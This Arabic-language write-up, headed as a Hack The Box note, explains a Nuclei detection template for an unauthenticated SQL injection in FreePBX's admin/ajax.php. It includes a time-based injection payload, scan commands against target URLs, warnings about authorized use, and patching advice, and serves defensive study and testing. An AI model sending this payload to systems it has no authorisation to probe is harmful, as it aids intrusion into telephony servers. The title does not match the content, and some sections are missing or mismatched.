Connected HTB Write-up

توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.

1. ما هو هذا القالب؟

هذا ملف YAML مخصص لمحرك Nuclei (أداة فحص الثغرات الأمنية) للكشف عن ثغرة CVE-2025-57819 في أنظمة FreePBX (نظام إدارة خوادم الاتصالات VoIP).

معلومات أساسية عن الثغرة:

  • النوع: SQL Injection غير مصدق (Unauthenticated) → يؤدي إلى RCE (تنفيذ كود عن بُعد)
  • الخطورة: Critical (CVSS 10.0)
  • الإصدارات المصابة: FreePBX \< 15.0.66, \< 16.0.89, \< 17.0.3
  • نقطة الضعف: ملف admin/ajax.php في وحدات userman أو endpoint

---

info:

3. الجزء الثاني: تعريف الطلب (Requests)

هنا يُحدد القالب ما الذي سيرسله Nuclei إلى الهدف:

yaml
requests:
  - method: POST
    path:
      - "{{BaseURL}}/admin/ajax.php?module=userman&command=checkPasswordReminder"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      username=admin' OR SLEEP(5)-- -&password=test

ما معنى الحمولة؟

plain text
username=admin' OR SLEEP(5)-- -&password=test
  • admin' → إغلاق الاقتباس في استعلام SQL
  • OR SLEEP(5) → إضافة شرط: "أو انتظر 5 ثوانٍ"
  • - - → تعليق بقية الاستعلام (تعطيله)
  • الهدف: إذا كان النظام مصاباً، سيتأخر الرد 5 ثوانٍ بسبب تنفيذ SLEEP(5) في قاعدة البيانات

4. الجزء الثالث: المطابقات (Matchers)

هنا يُحدد القالب كيف يعرف Nuclei أن الثغرة موجودة:

yaml
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
      - type: status
        status:
          - 200

شرح المطابقات:

<table header-row="true">

<tr>

<td>المطابقة</td>

<td>الشرح</td>

</tr>

<tr>

<td>matchers-condition: and</td>

<td>يجب تحقق كلتا الشرطين معاً</td>

</tr>

<tr>

<td>type: dsl + duration>=5</td>

<td>شرط مخصص: مدة الرد ≥ 5 ثوانٍ (Time-based Detection)</td>

</tr>

<tr>

<td>type: status + 200</td>

<td>رمز الحالة HTTP يجب أن يكون 200 (OK)</td>

</tr>

</table>

لماذا Time-based؟

  • هذه الطريقة آمنة وغير مدمرة (Non-destructive)
  • لا تغير أي شيء في قاعدة البيانات
  • تعتمد على الزمن: إذا تأخر الرد 5 ثوانٍ، فهذا يعني أن SLEEP(5) نُفذ → الثغرة موجودة

---

5. الجزء الرابع: الاستخراج (Extractors) - اختياري

في بعض النسخ، يُضاف قسم لاستخراج معلومات إضافية:

yaml
    extractors:
      - type: regex
        part: body
        regex:
          - "uid=([0-9]+)"

الهدف: استخراج معرف المستخدم أو بيانات أخرى من الرد للتأكيد.

6. كيف تستخدم هذا القالب؟ (الخطوات العملية)

الخطوة 1: تثبيت Nuclei

bash
# على Kali Linux
sudo apt update && sudo apt install nuclei -y

# أو باستخدام Docker
docker run projectdiscovery/nuclei -v

الخطوة 2: تحميل القالب

bash
# تحميل الملف مباشرة (إذا كان متاحاً)
wget <https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2025/CVE-2025-57819.yaml>

# أو استنساخ المستودع كاملاً
git clone <https://github.com/projectdiscovery/nuclei-templates.git>

الخطوة 3: تشغيل الفحص

bash
# فحص هدف واحد
nuclei -u <https://target.com> -t CVE-2025-57819.yaml

# فحص مع تفاصيل تصحيح (للتعلم)
nuclei -u <https://target.com> -t CVE-2025-57819.yaml -vv -debug

# فحص قائمة أهداف
nuclei -l targets.txt -t CVE-2025-57819.yaml

الخطوة 4: فهم النتائج

إذا ظهرت النتيجة:

plain text
[CVE-2025-57819] [http] [critical] <https://target.com/admin/ajax.php?module=userman&command=checkPasswordReminder>
[CVE-2025-57819] [elapsed] Time-based SQLi detected (delay >=5s)

→ هذا يعني أن النظام مصاب ويحتاج إلى تحديث فوري

7. ملاحظات أمنية مهمة جداً

> ⚠️ تحذير قانوني وأخلاقي:

  • استخدم هذا القالب فقط على أنظمة تملكها أو لديك تصريح رسمي بفحصها
  • CVE-2025-57819 هي Zero-day تم استغلالها في البرية (Actively Exploited)
  • إذا كان FreePBX الخاص بك متصلاً بالإنترنت وغير محدّث، افترض أنه تم اختراقه

---

8. كيف تحمي نفسك؟

  1. التحديث الفوري إلى:
  • FreePBX 15.0.66 أو أحدث
  • FreePBX 16.0.89 أو أحدث
  • FreePBX 17.0.3 أو أحدث
  1. حظر الوصول للوحة الإدارة من الإنترنت (استخدم VPN أو IP whitelist)
  2. المراقبة: راجع السجلات بحثاً عن:
  • طلبات POST غير طبيعية إلى ajax.php
  • ملفات مشبوهة مثل /var/www/html/.clean.sh
  • حسابات إدارية جديدة غير معروفة
